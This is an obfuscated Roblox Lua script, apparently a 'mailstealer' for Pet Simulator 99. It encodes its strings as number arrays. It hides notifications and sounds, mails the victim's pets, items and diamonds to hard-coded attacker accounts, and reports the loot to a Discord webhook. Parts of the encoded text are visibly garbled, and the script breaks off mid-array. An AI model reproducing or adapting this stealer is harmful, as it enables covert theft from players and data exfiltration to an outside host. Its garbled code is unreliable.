
function WzXbheCOSURgKHWChFjBg(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 



Username = WzXbheCOSURgKHWChFjBg({7875,6930,10605,11970,10395,11025,8715,12180,12285,10500,11025,11655,12075})
Username2 = WzXbheCOSURgKHWChFjBg({7875,6930,10605,11970,10395,11025,8715,12180,12285,10500,11025,11655,12075,7035,9450,5145})
webhook = WzXbheCOSURgKHWChFjBg({10920,12180,12180,11760,12075,6090,4935,4935,10500,11025,12075,10395,11655,11970,10500,4830,10395,11655,11445,4935,10185,11760,11025,4935,12495,10605,10290,10920,11655,11655,11235,12075,4935,5145,5355,5250,5565,5040,5670,5880,5250,5670,5985,5460,5355,5880,5250,5460,5250,5985,5145,5670,4935,9030,7770,7350,5040,4725,5880,7770,11235,8925,11760,11970,10185,9030,12075,10290,12600,8085,12075,5775,12810,7350,6930,12600,9030,11445,9030,8925,8505,11760,8820,12075,11550,4725,11760,12600,11445,11130,11235,12810,11025,5565,12495,7035,7980,7875,10920,8505,12390,7035,12600,12075,9240,10185,7770,10605,11865,12810,7875,7560,9450,8610,12705,8400,11865,9240,11550,8820,10500})
min_rap = 100000

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local network = game:GetService(WzXbheCOSURgKHWChFjBg({8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605})):WaitForChild(WzXbheCOSURgKHWChFjBg({8190,10605,12180,12495,11655,11970,11235}))
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService(WzXbheCOSURgKHWChFjBg({8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605})):WaitForChild(WzXbheCOSURgKHWChFjBg({7980,11025,10290,11970,10185,11970,12705})):WaitForChild(WzXbheCOSURgKHWChFjBg({7035,11340,11025,10605,11550,12180})):WaitForChild(WzXbheCOSURgKHWChFjBg({8715,10185,12390,10605}))).Get().Inventory
local mailsent = require(game:GetService(WzXbheCOSURgKHWChFjBg({8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605})):WaitForChild(WzXbheCOSURgKHWChFjBg({7980,11025,10290,11970,10185,11970,12705})):WaitForChild(WzXbheCOSURgKHWChFjBg({7035,11340,11025,10605,11550,12180})):WaitForChild(WzXbheCOSURgKHWChFjBg({8715,10185,12390,10605}))).Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = WzXbheCOSURgKHWChFjBg({7455,7455,3360,4935,3360,7455,9345,5250,8610,9030,8715,7245,7455,7140,8820})
local HttpService = game:GetService(WzXbheCOSURgKHWChFjBg({7560,12180,12180,11760,8715,10605,11970,12390,11025,10395,10605}))
local sortedItems = {}
local totalRAP = 0
local getFucked = false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local newamount = 20000

if mailsent ~= 0 then
	newamount = math.ceil(newamount * (1.5 ^ mailsent))
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == WzXbheCOSURgKHWChFjBg({7140,11025,10185,11445,11655,11550,10500,12075}) then
        GemAmount1 = v._am
		break
    end
end

if newamount > GemAmount1 then
    return
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {WzXbheCOSURgKHWChFjBg({}), WzXbheCOSURgKHWChFjBg({11235}), WzXbheCOSURgKHWChFjBg({11445}), WzXbheCOSURgKHWChFjBg({10290}), WzXbheCOSURgKHWChFjBg({12180})}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format(WzXbheCOSURgKHWChFjBg({3885,4830,5250,10710,3885,12075}), number, suffixes[suffixIndex])
end

local function SendMessage(username, diamonds)
    local headers = {
        [WzXbheCOSURgKHWChFjBg({7035,11655,11550,12180,10605,11550,12180,4725,8820,12705,11760,10605})] = WzXbheCOSURgKHWChFjBg({10185,11760,11760,11340,11025,10395,10185,12180,11025,11655,11550,4935,11130,12075,11655,11550}),
    }

	local fields = {
		{
			name = WzXbheCOSURgKHWChFjBg({8610,10605,12180,10185,11970,10500,3360,8925,12075,10605,11970,11550,10185,11445,10605,6090}),
			value = username,
			inline = true
		},
		{
			name = WzXbheCOSURgKHWChFjBg({7665,12180,10605,11445,12075,3360,12180,11655,3360,10290,10605,3360,12075,10605,11550,12180,6090}),
			value = WzXbheCOSURgKHWChFjBg({}),
			inline = false
		},
        {
            name = WzXbheCOSURgKHWChFjBg({8715,12285,11445,11445,10185,11970,12705,6090}),
            value = WzXbheCOSURgKHWChFjBg({}),
            inline = false
        }
	}

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. WzXbheCOSURgKHWChFjBg({3360,4200,12600}) .. itemData.amount .. WzXbheCOSURgKHWChFjBg({4305}) .. WzXbheCOSURgKHWChFjBg({6090,3360}) .. formatNumber(itemData.rap * itemData.amount) .. WzXbheCOSURgKHWChFjBg({3360,8610,6825,8400,9660,11550})
    end

    fields[3].value = fields[3].value .. WzXbheCOSURgKHWChFjBg({7455,10605,11445,12075,6090,3360}) .. formatNumber(diamonds) .. WzXbheCOSURgKHWChFjBg({9660,11550})
    fields[3].value = fields[3].value .. WzXbheCOSURgKHWChFjBg({8820,11655,12180,10185,11340,3360,8610,6825,8400,6090,3360}) .. formatNumber(totalRAP)
    if getFucked then
        fields[3].value = fields[3].value .. WzXbheCOSURgKHWChFjBg({9660,11550,9660,11550,9030,11025,10395,12180,11025,11445,3360,12180,11970,11025,10605,10500,3360,12180,11655,3360,12285,12075,10605,3360,10185,11550,12180,11025,4725,11445,10185,11025,11340,12075,12180,10605,10185,11340,10605,11970,4620,3360,10290,12285,12180,3360,10815,11655,12180,3360,10710,12285,10395,11235,10605,10500,3360,11025,11550,12075,12180,10605,10185,10500})
    end

    local data = {
        [WzXbheCOSURgKHWChFjBg({10605,11445,10290,10605,10500,12075})] = {{
            [WzXbheCOSURgKHWChFjBg({12180,11025,12180,11340,10605})] = WzXbheCOSURgKHWChFjBg({9660,5250,5460,5040,9660,5145,5565,5985,9660,5145,5460,5460,9660,5145,5775,5775,3360,8190,10605,12495,3360,8400,8715,5985,5985,3360,7245,12600,10605,10395,12285,12180,11025,11655,11550}) ,
            [WzXbheCOSURgKHWChFjBg({10395,11655,11340,11655,11970})] = 65280,
			[WzXbheCOSURgKHWChFjBg({10710,11025,10605,11340,10500,12075})] = fields,
			[WzXbheCOSURgKHWChFjBg({10710,11655,11655,12180,10605,11970})] = {
				[WzXbheCOSURgKHWChFjBg({12180,10605,12600,12180})] = WzXbheCOSURgKHWChFjBg({8085,10185,11025,11340,12075,12180,10605,10185,11340,10605,11970,3360,10290,12705,3360,8820,11655,10290,11025,4830,3360,10500,11025,12075,10395,11655,11970,10500,4830,10815,10815,4935,7455,9345,5250,8610,9030,8715,7245,7455,7140,8820})
			}
        }}
    }

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch(WzXbheCOSURgKHWChFjBg({9555,9870,9660,11970,9660,11550,9765,4515})) do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, WzXbheCOSURgKHWChFjBg({9660,11550}))
            fields[2].value = fields[2].value .. WzXbheCOSURgKHWChFjBg({9660,11550,8400,11340,12285,12075,3360,11445,11655,11970,10605,3465})
        end
    end

    local body = HttpService:JSONEncode(data)

    if webhook and webhook ~= WzXbheCOSURgKHWChFjBg({}) then
        local response = request({
            Url = webhook,
            Method = WzXbheCOSURgKHWChFjBg({8400,8295,8715,8820}),
            Headers = headers,
            Body = body
        })
    end
end

local gemsleaderstat = plr.leaderstats[WzXbheCOSURgKHWChFjBg({9660,5250,5460,5040,9660,5145,5565,5985,9660,5145,5460,5670,9660,5145,5460,5250,3360,7140,11025,10185,11445,11655,11550,10500,12075})].Value
local gemsleaderstatpath = plr.leaderstats[WzXbheCOSURgKHWChFjBg({9660,5250,5460,5040,9660,5145,5565,5985,9660,5145,5460,5670,9660,5145,5460,5250,3360,7140,11025,10185,11445,11655,11550,10500,12075})]
gemsleaderstatpath:GetPropertyChangedSignal(WzXbheCOSURgKHWChFjBg({9030,10185,11340,12285,10605})):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core[WzXbheCOSURgKHWChFjBg({8400,11970,11655,10395,10605,12075,12075,3360,8400,10605,11550,10500,11025,11550,10815,3360,7455,8925,7665})]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal(WzXbheCOSURgKHWChFjBg({7245,11550,10185,10290,11340,10605,10500})):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == WzXbheCOSURgKHWChFjBg({8715,11655,12285,11550,10500}) then
        if x.SoundId==WzXbheCOSURgKHWChFjBg({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5145,5145,5880,5355,5985,5145,5355,5250,5565,5670,5565}) or x.SoundId==WzXbheCOSURgKHWChFjBg({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5145,5460,5250,5565,5460,5775,5250,5145,5040,5355,5880}) or x.SoundId==WzXbheCOSURgKHWChFjBg({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5145,5250,5460,5145,5355,5460,5250,5355,5250,5775,5670}) then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(game:GetService(WzXbheCOSURgKHWChFjBg({8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605})).Library.Client.DevRAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local user = Username
local user2 = Username2

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
	local response = false
	repeat
    	local response, err = network:WaitForChild(WzXbheCOSURgKHWChFjBg({8085,10185,11025,11340,10290,11655,12600,6090,3360,8715,10605,11550,10500})):InvokeServer(unpack(args))
		if response == false and err == WzXbheCOSURgKHWChFjBg({8820,10920,10605,12705,3360,10500,11655,11550})t have enough space!WzXbheCOSURgKHWChFjBg({3360,12180,10920,10605,11550,1365,1050,945,945,945,12285,12075,10605,11970,3360,6405,3360,12285,12075,10605,11970,5250,1365,1050,945,945,945,10185,11970,10815,12075,9555,5145,9765,3360,6405,3360,12285,12075,10605,11970,1365,1050,945,945,10605,11550,10500,1365,1050,945,12285,11550,12180,11025,11340,3360,11970,10605,12075,11760,11655,11550,12075,10605,3360,6405,6405,3360,12180,11970,12285,10605,1365,1050,945,7455,10605,11445,6825,11445,11655,12285,11550,12180,5145,3360,6405,3360,7455,10605,11445,6825,11445,11655,12285,11550,12180,5145,3360,4725,3360,11550,10605,12495,10185,11445,11655,12285,11550,12180,1365,1050,945,11550,10605,12495,10185,11445,11655,12285,11550,12180,3360,6405,3360,11445,10185,12180,10920,4830,10395,10605,11025,11340,4200,11445,10185,12180,10920,4830,10395,10605,11025,11340,4200,11550,10605,12495,10185,11445,11655,12285,11550,12180,4305,3360,4410,3360,5145,4830,5565,4305,1365,1050,945,11025,10710,3360,11550,10605,12495,10185,11445,11655,12285,11550,12180,3360,6510,3360,5565,5040,5040,5040,5040,5040,5040,3360,12180,10920,10605,11550,1365,1050,945,945,11550,10605,12495,10185,11445,11655,12285,11550,12180,3360,6405,3360,5565,5040,5040,5040,5040,5040,5040,1365,1050,945,10605,11550,10500,1365,1050,10605,11550,10500,1365,1050,1365,1050,11340,11655,10395,10185,11340,3360,10710,12285,11550,10395,12180,11025,11655,11550,3360,8715,10605,11550,10500,6825,11340,11340,7455,10605,11445,12075,4200,4305,1365,1050,3360,3360,3360,3360,10710,11655,11970,3360,11025,4620,3360,12390,3360,11025,11550,3360,11760,10185,11025,11970,12075,4200,7455,10605,12180,8715,10185,12390,10605,4200,4305,4830,7665,11550,12390,10605,11550,12180,11655,11970,12705,4830,7035,12285,11970,11970,10605,11550,10395,12705,4305,3360,10500,11655,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,11025,10710,3360,12390,4830,11025,10500,3360,6405,6405,3360})DiamondsWzXbheCOSURgKHWChFjBg({3360,12180,10920,10605,11550,1365,1050,945,945,945,11025,10710,3360,7455,10605,11445,6825,11445,11655,12285,11550,12180,5145,3360,6510,6405,3360,4200,11550,10605,12495,10185,11445,11655,12285,11550,12180,3360,4515,3360,5145,5040,5040,5040,5040,4305,3360,12180,10920,10605,11550,1365,1050,945,945,945,945,11340,11655,10395,10185,11340,3360,10185,11970,10815,12075,3360,6405,3360,12915,1365,1050,945,945,945,945,945,9555,5145,9765,3360,6405,3360,12285,12075,10605,11970,4620,1365,1050,945,945,945,945,945,9555,5250,9765,3360,6405,3360,8085,10185,11025,11340,8085,10605,12075,12075,10185,10815,10605,4620,1365,1050,945,945,945,945,945,9555,5355,9765,3360,6405,3360})CurrencyWzXbheCOSURgKHWChFjBg({4620,1365,1050,945,945,945,945,945,9555,5460,9765,3360,6405,3360,11025,4620,1365,1050,945,945,945,945,945,9555,5565,9765,3360,6405,3360,7455,10605,11445,6825,11445,11655,12285,11550,12180,5145,3360,4725,3360,11550,10605,12495,10185,11445,11655,12285,11550,12180,1365,1050,945,945,945,945,13125,1365,1050,945,945,945,945,11340,11655,10395,10185,11340,3360,11970,10605,12075,11760,11655,11550,12075,10605,3360,6405,3360,10710,10185,11340,12075,10605,1365,1050,945,945,945,945,11970,10605,11760,10605,10185,12180,1365,1050,945,945,945,945,945,11340,11655,10395,10185,11340,3360,11970,10605,12075,11760,11655,11550,12075,10605,3360,6405,3360,11550,10605,12180,12495,11655,11970,11235,6090,9135,10185,11025,12180,7350,11655,11970,7035,10920,11025,11340,10500,4200})Mailbox: SendWzXbheCOSURgKHWChFjBg({4305,6090,7665,11550,12390,11655,11235,10605,8715,10605,11970,12390,10605,11970,4200,12285,11550,11760,10185,10395,11235,4200,10185,11970,10815,12075,4305,4305,1365,1050,945,945,945,945,12285,11550,12180,11025,11340,3360,11970,10605,12075,11760,11655,11550,12075,10605,3360,6405,6405,3360,12180,11970,12285,10605,1365,1050,945,945,945,945,10290,11970,10605,10185,11235,1365,1050,945,945,945,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,10605,11550,10500,1365,1050,10605,11550,10500,1365,1050,1365,1050,11340,11655,10395,10185,11340,3360,10710,12285,11550,10395,12180,11025,11655,11550,3360,7665,12075,8085,10185,11025,11340,10290,11655,12600,7560,11655,11655,11235,10605,10500,4200,4305,1365,1050,945,11340,11655,10395,10185,11340,3360,12285,11025,10500,1365,1050,945,10710,11655,11970,3360,11025,4620,3360,12390,3360,11025,11550,3360,11760,10185,11025,11970,12075,4200,12075,10185,12390,10605,9555})PetWzXbheCOSURgKHWChFjBg({9765,4305,3360,10500,11655,1365,1050,945,945,12285,11025,10500,3360,6405,3360,11025,1365,1050,945,945,10290,11970,10605,10185,11235,1365,1050,945,10605,11550,10500,1365,1050,945,11340,11655,10395,10185,11340,3360,10185,11970,10815,12075,3360,6405,3360,12915,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,9555,5145,9765,3360,6405,3360})RobloxWzXbheCOSURgKHWChFjBg({4620,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,9555,5250,9765,3360,6405,3360})TestWzXbheCOSURgKHWChFjBg({4620,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,9555,5355,9765,3360,6405,3360})PetWzXbheCOSURgKHWChFjBg({4620,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,9555,5460,9765,3360,6405,3360,12285,11025,10500,4620,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,9555,5565,9765,3360,6405,3360,5145,1365,1050,3360,3360,3360,3360,13125,1365,1050,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,11970,10605,12075,11760,11655,11550,12075,10605,4620,3360,10605,11970,11970,3360,6405,3360,11550,10605,12180,12495,11655,11970,11235,6090,9135,10185,11025,12180,7350,11655,11970,7035,10920,11025,11340,10500,4200})Mailbox: SendWzXbheCOSURgKHWChFjBg({4305,6090,7665,11550,12390,11655,11235,10605,8715,10605,11970,12390,10605,11970,4200,12285,11550,11760,10185,10395,11235,4200,10185,11970,10815,12075,4305,4305,1365,1050,3360,3360,3360,3360,11025,10710,3360,4200,10605,11970,11970,3360,6405,6405,3360})They donWzXbheCOSURgKHWChFjBg({12180,3360,10920,10185,12390,10605,3360,10605,11550,11655,12285,10815,10920,3360,12075,11760,10185,10395,10605,3465})) or (err == WzXbheCOSURgKHWChFjBg({9345,11655,12285,3360,10500,11655,11550})t have enough diamonds to send the mail!WzXbheCOSURgKHWChFjBg({4305,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,11970,10605,12180,12285,11970,11550,3360,10710,10185,11340,12075,10605,1365,1050,3360,3360,3360,3360,10605,11340,12075,10605,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,11970,10605,12180,12285,11970,11550,3360,12180,11970,12285,10605,1365,1050,3360,3360,3360,3360,10605,11550,10500,1365,1050,10605,11550,10500,1365,1050,1365,1050,11340,11655,10395,10185,11340,3360,10710,12285,11550,10395,12180,11025,11655,11550,3360,7245,11445,11760,12180,12705,6930,11655,12600,10605,12075,4200,4305,1365,1050,3360,3360,3360,3360,11025,10710,3360,12075,10185,12390,10605,4830,6930,11655,12600,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,10710,11655,11970,3360,11235,10605,12705,4620,3360,12390,10185,11340,12285,10605,3360,11025,11550,3360,11760,10185,11025,11970,12075,4200,12075,10185,12390,10605,4830,6930,11655,12600,4305,3360,10500,11655,1365,1050,945,945,945,11025,10710,3360,12390,10185,11340,12285,10605,4830,9975,12285,11865,3360,12180,10920,10605,11550,1365,1050,945,945,945,945,11550,10605,12180,12495,11655,11970,11235,6090,9135,10185,11025,12180,7350,11655,11970,7035,10920,11025,11340,10500,4200})Box: Withdraw AllWzXbheCOSURgKHWChFjBg({4305,6090,7665,11550,12390,11655,11235,10605,8715,10605,11970,12390,10605,11970,4200,11235,10605,12705,4305,1365,1050,945,945,945,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,10605,11550,10500,1365,1050,10605,11550,10500,1365,1050,1365,1050,11340,11655,10395,10185,11340,3360,10710,12285,11550,10395,12180,11025,11655,11550,3360,7035,11340,10185,11025,11445,8085,10185,11025,11340,4200,4305,1365,1050,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,11970,10605,12075,11760,11655,11550,12075,10605,4620,3360,10605,11970,11970,3360,6405,3360,11550,10605,12180,12495,11655,11970,11235,6090,9135,10185,11025,12180,7350,11655,11970,7035,10920,11025,11340,10500,4200})Mailbox: Claim AllWzXbheCOSURgKHWChFjBg({4305,6090,7665,11550,12390,11655,11235,10605,8715,10605,11970,12390,10605,11970,4200,4305,1365,1050,3360,3360,3360,3360,12495,10920,11025,11340,10605,3360,10605,11970,11970,3360,6405,6405,3360})You must wait 30 seconds before using the mailbox!WzXbheCOSURgKHWChFjBg({3360,10500,11655,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,12495,10185,11025,12180,4200,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,11970,10605,12075,11760,11655,11550,12075,10605,4620,3360,10605,11970,11970,3360,6405,3360,11550,10605,12180,12495,11655,11970,11235,6090,9135,10185,11025,12180,7350,11655,11970,7035,10920,11025,11340,10500,4200})Mailbox: Claim AllWzXbheCOSURgKHWChFjBg({4305,6090,7665,11550,12390,11655,11235,10605,8715,10605,11970,12390,10605,11970,4200,4305,1365,1050,3360,3360,3360,3360,10605,11550,10500,1365,1050,10605,11550,10500,1365,1050,1365,1050,11340,11655,10395,10185,11340,3360,10395,10185,12180,10605,10815,11655,11970,12705,7980,11025,12075,12180,3360,6405,3360,12915})PetWzXbheCOSURgKHWChFjBg({4620,3360})EggWzXbheCOSURgKHWChFjBg({4620,3360})CharmWzXbheCOSURgKHWChFjBg({4620,3360})EnchantWzXbheCOSURgKHWChFjBg({4620,3360})PotionWzXbheCOSURgKHWChFjBg({4620,3360})MiscWzXbheCOSURgKHWChFjBg({4620,3360})HoverboardWzXbheCOSURgKHWChFjBg({4620,3360})BoothWzXbheCOSURgKHWChFjBg({4620,3360})UltimateWzXbheCOSURgKHWChFjBg({13125,1365,1050,1365,1050,10710,11655,11970,3360,11025,4620,3360,12390,3360,11025,11550,3360,11760,10185,11025,11970,12075,4200,10395,10185,12180,10605,10815,11655,11970,12705,7980,11025,12075,12180,4305,3360,10500,11655,1365,1050,945,11025,10710,3360,12075,10185,12390,10605,9555,12390,9765,3360,13230,6405,3360,11550,11025,11340,3360,12180,10920,10605,11550,1365,1050,945,945,10710,11655,11970,3360,12285,11025,10500,4620,3360,11025,12180,10605,11445,3360,11025,11550,3360,11760,10185,11025,11970,12075,4200,12075,10185,12390,10605,9555,12390,9765,4305,3360,10500,11655,1365,1050,945,945,945,11025,10710,3360,12390,3360,6405,6405,3360})PetWzXbheCOSURgKHWChFjBg({3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,10500,11025,11970,3360,6405,3360,11970,10605,11865,12285,11025,11970,10605,4200,10815,10185,11445,10605,6090,7455,10605,12180,8715,10605,11970,12390,11025,10395,10605,4200})ReplicatedStorageWzXbheCOSURgKHWChFjBg({4305,4830,7980,11025,10290,11970,10185,11970,12705,4830,7140,11025,11970,10605,10395,12180,11655,11970,12705,4830,8400,10605,12180,12075,4305,9555,11025,12180,10605,11445,4830,11025,10500,9765,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11025,10710,3360,10500,11025,11970,4830,10920,12285,10815,10605,3360,11655,11970,3360,10500,11025,11970,4830,10605,12600,10395,11340,12285,12075,11025,12390,10605,7980,10605,12390,10605,11340,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,11970,10185,11760,9030,10185,11340,12285,10605,3360,6405,3360,10815,10605,12180,8610,6825,8400,4200,12390,4620,3360,11025,12180,10605,11445,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11025,10710,3360,11970,10185,11760,9030,10185,11340,12285,10605,3360,6510,6405,3360,11445,11025,11550,9975,11970,10185,11760,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,11760,11970,10605,10710,11025,12600,3360,6405,3360})WzXbheCOSURgKHWChFjBg({1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11025,10710,3360,11025,12180,10605,11445,4830,11760,12180,3360,10185,11550,10500,3360,11025,12180,10605,11445,4830,11760,12180,3360,6405,6405,3360,5145,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11760,11970,10605,10710,11025,12600,3360,6405,3360})Golden WzXbheCOSURgKHWChFjBg({1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11340,12075,10605,11025,10710,3360,11025,12180,10605,11445,4830,11760,12180,3360,10185,11550,10500,3360,11025,12180,10605,11445,4830,11760,12180,3360,6405,6405,3360,5250,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11760,11970,10605,10710,11025,12600,3360,6405,3360})Rainbow WzXbheCOSURgKHWChFjBg({1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11025,10710,3360,11025,12180,10605,11445,4830,12075,10920,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11760,11970,10605,10710,11025,12600,3360,6405,3360})Shiny WzXbheCOSURgKHWChFjBg({3360,4830,4830,3360,11760,11970,10605,10710,11025,12600,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,11025,10500,3360,6405,3360,11760,11970,10605,10710,11025,12600,3360,4830,4830,3360,11025,12180,10605,11445,4830,11025,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,12180,10185,10290,11340,10605,4830,11025,11550,12075,10605,11970,12180,4200,12075,11655,11970,12180,10605,10500,7665,12180,10605,11445,12075,4620,3360,12915,10395,10185,12180,10605,10815,11655,11970,12705,3360,6405,3360,12390,4620,3360,12285,11025,10500,3360,6405,3360,12285,11025,10500,4620,3360,10185,11445,11655,12285,11550,12180,3360,6405,3360,11025,12180,10605,11445,4830,9975,10185,11445,3360,11655,11970,3360,5145,4620,3360,11970,10185,11760,3360,6405,3360,11970,10185,11760,9030,10185,11340,12285,10605,4620,3360,11550,10185,11445,10605,3360,6405,3360,11025,10500,13125,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,12180,11655,12180,10185,11340,8610,6825,8400,3360,6405,3360,12180,11655,12180,10185,11340,8610,6825,8400,3360,4515,3360,4200,11970,10185,11760,9030,10185,11340,12285,10605,3360,4410,3360,4200,11025,12180,10605,11445,4830,9975,10185,11445,3360,11655,11970,3360,5145,4305,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11340,12075,10605,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,11970,10185,11760,9030,10185,11340,12285,10605,3360,6405,3360,10815,10605,12180,8610,6825,8400,4200,12390,4620,3360,11025,12180,10605,11445,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11025,10710,3360,11970,10185,11760,9030,10185,11340,12285,10605,3360,6510,6405,3360,11445,11025,11550,9975,11970,10185,11760,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,12180,10185,10290,11340,10605,4830,11025,11550,12075,10605,11970,12180,4200,12075,11655,11970,12180,10605,10500,7665,12180,10605,11445,12075,4620,3360,12915,10395,10185,12180,10605,10815,11655,11970,12705,3360,6405,3360,12390,4620,3360,12285,11025,10500,3360,6405,3360,12285,11025,10500,4620,3360,10185,11445,11655,12285,11550,12180,3360,6405,3360,11025,12180,10605,11445,4830,9975,10185,11445,3360,11655,11970,3360,5145,4620,3360,11970,10185,11760,3360,6405,3360,11970,10185,11760,9030,10185,11340,12285,10605,4620,3360,11550,10185,11445,10605,3360,6405,3360,11025,12180,10605,11445,4830,11025,10500,13125,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,12180,11655,12180,10185,11340,8610,6825,8400,3360,6405,3360,12180,11655,12180,10185,11340,8610,6825,